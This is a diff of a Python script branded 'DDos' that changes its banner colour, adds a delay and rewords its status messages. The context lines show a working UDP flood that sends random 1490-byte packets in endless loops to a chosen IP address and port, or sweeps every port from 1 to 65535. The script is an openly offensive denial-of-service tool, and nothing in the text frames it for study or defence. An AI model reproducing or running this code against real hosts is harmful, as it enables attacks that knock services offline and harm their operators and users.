@@ -28,7 +28,9 @@ bytes = random._urandom(1490)
 ###################################################################################
 os.system("clear")
 os.system("figlet DDos")
-print("""\033[94m
+time.sleep(3)
+os.system("clear")
+print("""\033[93m
 ███████████████████████
 ▀─▄▄▀█▄─▄▄▀█─▄▄─█─▄▄▄▄█
 █─██─██─██─█─██─█▄▄▄▄─█
@@ -71,7 +73,7 @@ if port == "all":
      while True:
           sock.sendto(bytes, (ip,port))
           port = port + 1
-          print ("Has sent %s data packet %s port %d"%(sent,ip,port))
+          print ("Has sent %s packet %s port %d"%(sent,ip,port))
           time.sleep((1000-speed)/2000)
           if port == 65535:
                port = 1
@@ -81,5 +83,5 @@ else:
      while True:
           sock.sendto(bytes, (ip,port))
           sent = sent + 1
-          print ("Has sent %s data packet %s port %d"%(sent,ip,port))
+          print ("Has sent %s packet %s port %d"%(sent,ip,port))
           time.sleep((1000-speed)/2000)
